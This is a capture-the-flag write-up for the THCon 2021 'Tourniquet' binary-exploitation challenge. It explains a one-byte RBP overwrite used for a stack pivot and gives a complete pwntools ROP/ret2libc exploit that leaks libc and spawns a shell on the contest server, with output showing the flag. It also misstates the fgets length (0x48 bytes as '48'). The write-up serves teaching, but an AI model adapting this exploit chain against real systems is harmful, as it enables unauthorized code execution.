## Tourniquet

> Points: 249  
>  
> Solves: 12

### Description:  
```  
Such a simple program can't be hacked, change my mind.

nc remote1.thcon.party 10901  
nc remote2.thcon.party 10901

Be careful : ASLR is set to 2

Creator : voydstack (Discord : voydstack#6035)  
```

### Files:  
```  
libc.so.6  
tourniquet  
Dockerfile  
```

## Analysis:  
```  
$ checksec tourniquet  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)

$ ./tourniquet  
haha i'm unhackable right ?  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
$ ./tourniquet  
haha i'm unhackable right ?  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Bus error (core dumped)  
```

## Solution:

```  
void main_function(void)

{  
 char local_48 [64];  
  
 puts("haha i\'m unhackable right ?");  
 fgets(local_48,0x48,stdin);  
 return;  
}  
```

The return address cannot be changed because fgets() reads 48 bytes.  
We can change the value of the RBP register, but we can't set to an
appropriate value of RBP because you don't know the stack address.  
I noticed that ROP can be executed by changing the least significant byte of
the rbp register to null.  
The probability of success is 1/16 depending on the state of the address of
the stack.

```  
0x7fffffffddc0: 0x0000000000000000      0x00007fffffffde20  
0x7fffffffddd0: 0x0000000000400510      0x0000000000400623

0x7fffffffdde0: 0x4141414141414141      0x00000000004006d3  
0x7fffffffddf0: 0x0000000000601018      0x00000000004004dc  
0x7fffffffde00: 0x0000000000400510      0x0000000000400510  
0x7fffffffde10: 0x4242424242424242      0x0a42424242424242

0x7fffffffde20: 0x00007fffffffde00      0x000000000040065d  
                               ^  
                               | This 8 bytes is set rbp and change the lowest byte to null.  
0x7fffffffde30: 0x00007fffffffdf28      0x0000000100000000  
0x7fffffffde40: 0x0000000000400670      0x00007ffff7a03bf7  
```

## Exploit code:  
```python  
# Be careful : ASLR is set to 2

from pwn import *

#context(os='linux', arch='amd64')  
#context.log_level = 'debug'

BINARY = './tourniquet'  
elf  = ELF(BINARY)

pop_rdi_ret = 0x4006d3 # pop rdi; ret;

for i in range(100):  
 print(i)  
 if len(sys.argv) > 1 and sys.argv[1] == 'r':  
   HOST = "remote1.thcon.party"  
   PORT = 10901  
   s = remote(HOST, PORT)  
   libc = elf.libc  
 else:  
   s = process(BINARY)  
   libc = elf.libc

 s.recvuntil("haha i'm unhackable right ?\n")

 buf  = b"A"*8  
 buf += p64(pop_rdi_ret)  
 buf += p64(elf.got.puts)  
 buf += p64(elf.plt.puts)  
 buf += p64(elf.sym._start)  
 buf += p64(elf.sym._start)  
 buf += b"B"*0xf  
 s.sendline(buf)

 try:  
   r = s.recvuntil("\n")[:-1]  
   puts_addr = u64(r + b"\x00\x00")  
   libc_base = puts_addr - libc.sym.puts  
   system_addr = libc_base + libc.sym.system  
   binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))  
   print("puts_addr   =", hex(puts_addr))  
   print("libc_base   =", hex(libc_base))

   s.recvuntil("haha i'm unhackable right ?\n")

   buf  = b"C"*0x18  
   buf += p64(pop_rdi_ret+1)  
   buf += p64(pop_rdi_ret)  
   buf += p64(binsh_addr)  
   buf += p64(system_addr)  
   buf += b"B"*7  
   s.sendline(buf)

   s.interactive()

 except:  
   s.close()  
```

## Results:  
```  
mito@ubuntu:~/CTF/THC_CTF_2021/Pwn_Tourniquet_250$ python3 solve.py r  
[*] '/home/mito/CTF/THC_CTF_2021/Pwn_Tourniquet_250/tourniquet'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
0  
[+] Opening connection to remote1.thcon.party on port 10901: Done  
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] Closed connection to remote1.thcon.party port 10901  
1  
[+] Opening connection to remote1.thcon.party on port 10901: Done  
[*] Closed connection to remote1.thcon.party port 10901  
2  
[+] Opening connection to remote1.thcon.party on port 10901: Done  
[*] Closed connection to remote1.thcon.party port 10901  
3  
[+] Opening connection to remote1.thcon.party on port 10901: Done  
puts_addr   = 0x7fb5ae851aa0  
libc_base   = 0x7fb5ae7d1000  
[*] Switching to interactive mode  
$ id  
uid=1000(user) gid=1000(user) groups=1000(user)  
$ ls -l  
total 128  
-rw------- 1 user user 376832 Jun 15 05:40 core  
-rw-r--r-- 1 root root     40 Jun  8 20:45 flag.txt  
-rwxr-xr-x 1 root root   8464 Jun  8 20:45 tourniquet  
$ cat flag.txt  
THCon21{h4hA_s74cK-p1v0T_g0o_BrrRrrR!!}  
```

Original writeup
(https://github.com/mito753/CTF/tree/main/2021/THC_CTF_2021/Pwn_Tourniquet).